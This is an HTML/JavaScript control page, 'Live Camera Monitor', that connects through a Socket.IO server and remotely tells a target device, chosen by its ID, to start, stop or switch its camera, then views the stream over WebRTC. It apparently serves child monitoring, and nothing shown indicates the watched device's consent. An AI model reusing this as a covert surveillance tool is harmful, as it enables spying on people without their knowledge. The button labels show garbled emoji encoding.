<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Live Camera Monitor</title>

<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.js"></script>

<style>
/* same CSS ‚Äî unchanged */
</style>
</head>

<body>

<div class="app">

    <div class="header">
        <span>Live Camera</span>
        <span id="status" class="status">OFFLINE</span>
    </div>

    <div class="video-box">
        <video id="remoteVideo" autoplay playsinline muted></video>
    </div>

    <div class="controls">
        <button class="btn start" onclick="startCamera()">‚ñ∂ START</button>
        <button class="btn switch" onclick="switchCamera()">üîÑ</button>
        <button class="btn stop" onclick="stopCamera()">‚èπ STOP</button>
    </div>

</div>

<script>

const SERVER = "https://child-v9no.onrender.com";

const params = new URLSearchParams(window.location.search);
let DEVICE_ID = params.get("id") || localStorage.getItem("savedDeviceId");

if(!DEVICE_ID){
    alert("Device ID missing!");
}

let socket = io(SERVER);
let pc = null;

const config = {
    iceServers:[{ urls:"stun:stun.l.google.com:19302" }]
};

/* ================= SOCKET ================= */

socket.on("connect", ()=>{
    socket.emit("join-room","ADMIN");
});

/* ================= OFFER ================= */

socket.on("offer", async (data)=>{

    // üî• CRITICAL FIX
    if(pc){
        pc.close();
        pc = null;
    }

    pc = new RTCPeerConnection(config);

    pc.ontrack = e=>{
        const video = document.getElementById("remoteVideo");

        video.srcObject = e.streams[0] || new MediaStream([e.track]);

        // üî• MOBILE AUTOPLAY FIX
        video.play().catch(()=>{});

        setStatus(true);
    };

    pc.onicecandidate = e=>{
        if(e.candidate){
            socket.emit("candidate",{
                target: DEVICE_ID,
                candidate: e.candidate.candidate,
                sdpMid: e.candidate.sdpMid,
                sdpMLineIndex: e.candidate.sdpMLineIndex
            });
        }
    };

    await pc.setRemoteDescription(data);

    const ans = await pc.createAnswer();
    await pc.setLocalDescription(ans);

    socket.emit("answer",{
        target: DEVICE_ID,
        sdp: ans.sdp
    });
});

/* ================= ICE ================= */

socket.on("candidate", async d=>{
    if(pc){
        await pc.addIceCandidate(d);
    }
});

/* ================= BUTTONS ================= */

function startCamera(){
    socket.emit("send-command",{
        targetId: DEVICE_ID,
        command: "start_video"
    });
}

function stopCamera(){

    socket.emit("send-command",{
        targetId: DEVICE_ID,
        command: "stop_video"
    });

    const v = document.getElementById("remoteVideo");
    v.srcObject = null;

    if(pc){
        pc.close();
        pc = null;
    }

    setStatus(false);
}

function switchCamera(){
    socket.emit("switch-camera",{
        target: DEVICE_ID
    });
}

/* ================= UI ================= */

function setStatus(live){
    const s = document.getElementById("status");
    s.textContent = live ? "LIVE" : "OFFLINE";
    s.className = live ? "status live" : "status";
}

</script>
</body>
</html>
